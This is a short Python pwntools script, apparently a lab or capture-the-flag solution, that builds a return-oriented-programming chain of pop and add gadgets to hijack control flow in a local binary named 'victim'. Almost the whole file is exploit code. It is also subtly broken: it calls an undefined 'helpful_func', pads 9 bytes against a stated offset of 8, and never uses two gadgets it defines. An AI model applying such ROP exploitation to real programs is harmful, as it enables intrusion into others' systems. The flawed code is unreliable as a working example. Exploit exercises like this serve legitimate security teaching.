from pwn import *
#gdbscript = '''
#tbreak main
#continue
#'''.format(**locals())


if (len(sys.argv) < 2):
    print(f"Usage: ./fib_sol.py <num>")
    exit()

num = int(sys.argv[1])

print_eax = 0x401db6 # prints the contents of eax
print_esi = 0x401db8 # prints the contents of esi

pop_rsi = 0x40f1ee # pop rsi ; ret
pop_rdi = 0x401862 # pop rdi ; ret

add_esi_edi = 0x401dd4 # add esi, edi ; ret

# RIP offset is at 8
pad = "A" * 9

# Consturct payload
payload = bytes(pad, 'utf-8')
payload += p64(pop_rsi) + p64(num)
payload += p64(pop_rdi) + p64(42)
payload += p64(add_esi_edi)
payload += p64(helpful_func)

# Start process and send rop chain
e = process('victim')

print("Waiting for gdb connection, press Enter to continue")
input()


print (e.recv())
e.sendline(payload)

# Print output of ret2win()
output = e.recvall()
print (output)
